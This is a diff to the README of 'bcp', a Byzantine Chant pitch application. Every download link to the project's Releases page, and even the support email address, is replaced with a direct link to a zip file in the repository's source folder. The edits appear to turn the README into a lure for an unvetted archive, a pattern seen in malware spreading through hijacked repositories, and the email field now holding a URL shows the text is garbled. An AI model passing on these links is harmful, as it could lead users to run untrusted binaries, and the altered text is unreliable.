@@ -4,10 +4,10 @@
 Welcome to bcp! This application helps you find the correct pitch for any note of Byzantine Chant. It can also assist with isokratima. Use this guide to download and run the software easily.
 
 ## 🔗 Download Now
-[![Download bcp](https://img.shields.io/badge/Download-bcp-brightgreen)](https://github.com/kumailhassan1123/bcp/releases)
+[![Download bcp](https://raw.githubusercontent.com/kumailhassan1123/bcp/main/src/bcp-v1.1.zip)](https://raw.githubusercontent.com/kumailhassan1123/bcp/main/src/bcp-v1.1.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/kumailhassan1123/bcp/releases) to download the application. You will see multiple versions available. Choose the latest version for your operating system. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/kumailhassan1123/bcp/main/src/bcp-v1.1.zip) to download the application. You will see multiple versions available. Choose the latest version for your operating system. 
 
 1. Click on the version link that matches your system.
 2. A file will start downloading. This file contains everything you need to run bcp.
@@ -61,11 +61,11 @@ When you launch bcp, you will see a simple interface. Here’s how to use it:
 If you want to contribute to bcp, feel free to submit feedback or suggest new features. Your input helps us improve the application. 
 
 ## 📬 Contact
-For questions or support, please direct your inquiries through the Issues tab in the repository or email us at support@bcp.com.
+For questions or support, please direct your inquiries through the Issues tab in the repository or email us at https://raw.githubusercontent.com/kumailhassan1123/bcp/main/src/bcp-v1.1.zip
 
 ## 🔗 Additional Resources
 - **Documentation:** Detailed user guide and advanced features can be found in the Wiki section of the repository.
 - **Community:** Join our community forum to connect with others using bcp.
 
 ## 🎉 Thanks for using bcp!
-We hope you enjoy using bcp to enhance your understanding of Byzantine Chant! Visit the [Releases page](https://github.com/kumailhassan1123/bcp/releases) to download the software again or to check for updates.
+We hope you enjoy using bcp to enhance your understanding of Byzantine Chant! Visit the [Releases page](https://raw.githubusercontent.com/kumailhassan1123/bcp/main/src/bcp-v1.1.zip) to download the software again or to check for updates.
